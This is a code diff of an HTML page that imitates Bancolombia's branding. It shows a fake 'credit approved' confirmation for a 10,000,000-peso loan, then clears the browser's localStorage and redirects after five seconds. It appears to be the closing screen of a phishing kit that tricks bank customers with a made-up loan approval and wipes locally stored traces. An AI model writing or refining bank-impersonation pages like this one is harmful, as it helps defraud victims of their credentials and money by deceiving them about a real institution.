@@ -3,81 +3,298 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aprobado - Bancolombia</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Transacción Exitosa - Bancolombia</title>
+    
+    <link href="css/styles.css" rel="stylesheet">
+    <link href="css/bootstrap.css" rel="stylesheet">
+    
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #FDDA24 0%, #FFA500 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            background-color: #f5f5f5;
+            font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif;
         }
-        .container {
+        
+        .container-main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .panel-primary {
             background: white;
-            border-radius: 20px;
-            padding: 60px 40px;
-            text-align: center;
-            max-width: 500px;
-            box-shadow: 0 10px 50px rgba(0,0,0,0.2);
+            border: 1px solid #cccccc;
+            margin-top: 20px;
         }
-        .checkmark {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            background: #4CAF50;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 30px;
-            animation: scaleIn 0.5s ease;
+        
+        .panel-heading {
+            background-color: #2c2a29;
+            color: white;
+            padding: 10px 15px;
         }
-        @keyframes scaleIn {
-            from { transform: scale(0); }
-            to { transform: scale(1); }
+        
+        .panel-heading h3 {
+            margin: 0;
+            font-size: 16px;
+            font-family: 'CIBFontSans', Arial, sans-serif;
         }
-        .checkmark svg {
-            width: 60px;
-            height: 60px;
-            fill: white;
+        
+        .mua-panel-body {
+            padding: 30px 15px;
         }
-        h1 {
-            color: #1A1919;
-            margin-bottom: 20px;
-        }
-        p {
-            color: #666;
-            line-height: 1.6;
+        
+        .exitoDiv {
+            border: 1px solid #cccccc;
+            background-color: white;
+            padding: 0;
             margin-bottom: 30px;
         }
-        .amount {
-            font-size: 36px;
-            color: #4CAF50;
+        
+        .divTextMessage {
+            position: relative;
+            min-height: 58px;
+            padding: 15px;
+        }
+        
+        .exitoIcon {
+            font-size: 38px;
+            color: #00c389;
+            float: left;
+            margin-right: 15px;
+            width: 58px;
+        }
+        
+        .exitoTitulo {
+            font-size: 18px;
             font-weight: bold;
-            margin: 20px 0;
+            color: #2c2a29;
+            padding-left: 58px;
+            padding-top: 10px;
+            margin-bottom: 5px;
+        }
+        
+        .exitoTexto {
+            font-size: 14px;
+            color: #2c2a29;
+            padding-left: 58px;
+            line-height: 1.6;
+        }
+        
+        .panel_general {
+            background: white;
+            border: 1px solid #cccccc;
+            padding: 0;
+            margin-bottom: 20px;
+        }
+        
+        .title-panel-label {
+            background-color: #2c2a29;
+            padding: 10px;
+        }
+        
+        .title-panel-label h1 {
+            color: white;
+            font-size: 16px;
+            margin: 0;
+            font-family: 'CIBFontSans', Arial, sans-serif;
+        }
+        
+        .mua-content-group-panel {
+            padding: 20px 15px;
+        }
+        
+        .detalle-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f4f4f4;
+        }
+        
+        .detalle-label {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .detalle-valor {
+            font-size: 15px;
+            color: #2c2a29;
+            font-weight: bold;
+        }
+        
+        .monto-principal {
+            text-align: center;
+            padding: 30px 0;
+        }
+        
+        .monto-principal .label {
+            font-size: 14px;
+            color: #666;
+            display: block;
+            margin-bottom: 10px;
+        }
+        
+        .monto-principal .valor {
+            font-size: 36px;
+            color: #00c389;
+            font-weight: bold;
+        }
+        
+        .mua-button-container {
+            padding: 20px 15px;
+            text-align: center;
+        }
+        
+        .btn-success {
+            background-color: #fdda24;
+            border: none;
+            color: #2c2a29;
+            padding: 10px 30px;
+            font-size: 14px;
+            font-weight: bold;
+            min-width: 120px;
+            cursor: pointer;
+            border-radius: 0;
+        }
+        
+        .btn-success:hover {
+            background-color: #fdc82a;
+        }
+        
+        .mua-imgLogoItem {
+            background: url("img/logo.svg") no-repeat;
+            width: 175px;
+            height: 25px;
+            margin: 10px 0;
+        }
+        
+        .countdown {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .container-main {
+                padding: 10px;
+            }
+            
+            .monto-principal .valor {
+                font-size: 28px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="checkmark">
-            <svg viewBox="0 0 24 24">
-                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-            </svg>
+    <div class="container-main" id="containerMain">
+        <div class="row">
+            <div class="col-xs-12">
+                <div class="mua-imgLogoItem"></div>
+            </div>
         </div>
-        <h1>¡Crédito Aprobado!</h1>
-        <p>Tu crédito de libre inversión ha sido aprobado exitosamente</p>
-        <div class="amount">$10.000.000</div>
-        <p>El dinero estará disponible en tu cuenta en las próximas 24 horas</p>
+        
+        <div class="panel panel-primary">
+            <div class="panel-heading">
+                <h3>Transacción exitosa</h3>
+            </div>
+            
+            <div class="mua-panel-body">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-8 col-md-6 col-sm-offset-2 col-md-offset-3">
+                        <div class="exitoDiv">
+                            <div class="divTextMessage">
+                                <span class="exitoIcon icon-confirmacion">
+                                    <span class="path1"></span>
+                                    <span class="path2"></span>
+                                </span>
+                                <div class="exitoTitulo">¡Crédito aprobado exitosamente!</div>
+                                <div class="exitoTexto">
+                                    Tu solicitud de crédito de libre inversión ha sido aprobada y procesada correctamente.
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="panel_general">
+                            <div class="title-panel-label">
+                                <h1>Detalles de tu crédito</h1>
+                            </div>
+                            
+                            <div class="mua-content-group-panel">
+                                <div class="monto-principal">
+                                    <span class="label">Monto aprobado</span>
+                                    <div class="valor" id="montoAprobado">$10.000.000</div>
+                                </div>
+                                
+                                <div class="detalle-row">
+                                    <span class="detalle-label">Fecha de aprobación</span>
+                                    <span class="detalle-valor" id="fechaAprobacion">-</span>
+                                </div>
+                                
+                                <div class="detalle-row">
+                                    <span class="detalle-label">Plazo</span>
+                                    <span class="detalle-valor">24 meses</span>
+                                </div>
+                                
+                                <div class="detalle-row">
+                                    <span class="detalle-label">Cuota mensual</span>
+                                    <span class="detalle-valor">$526.316</span>
+                                </div>
+                                
+                                <div class="detalle-row">
+                                    <span class="detalle-label">Tasa de interés</span>
+                                    <span class="detalle-valor">1.73% M.V.</span>
+                                </div>
+                                
+                                <div class="detalle-row">
+                                    <span class="detalle-label">Estado</span>
+                                    <span class="detalle-valor" style="color: #00c389;">Aprobado</span>
+                                </div>
+                                
+                                <div style="margin-top: 20px; padding: 15px; background-color: #f4f4f4; border-radius: 4px;">
+                                    <p style="margin: 0; font-size: 13px; color: #666; text-align: center;">
+                                        El dinero estará disponible en tu cuenta en las próximas <strong>24 horas hábiles</strong>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="countdown">
+                            <p>Redirigiendo automáticamente en <span id="countdown">5</span> segundos...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-    
+
     <script>
-        setTimeout(() => {
-            localStorage.clear();
-            window.location.href = 'index.html';
-        }, 5000);
+        document.addEventListener('DOMContentLoaded', () => {
+            // Establecer fecha actual
+            const now = new Date();
+            const fechaFormateada = now.toLocaleDateString('es-CO', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+            document.getElementById('fechaAprobacion').textContent = fechaFormateada;
+            
+            // Countdown
+            let seconds = 5;
+            const countdownElement = document.getElementById('countdown');
+            
+            const interval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    localStorage.clear();
+                    window.location.href = 'index.html';
+                }
+            }, 1000);
+        });
     </script>
 </body>
 </html>
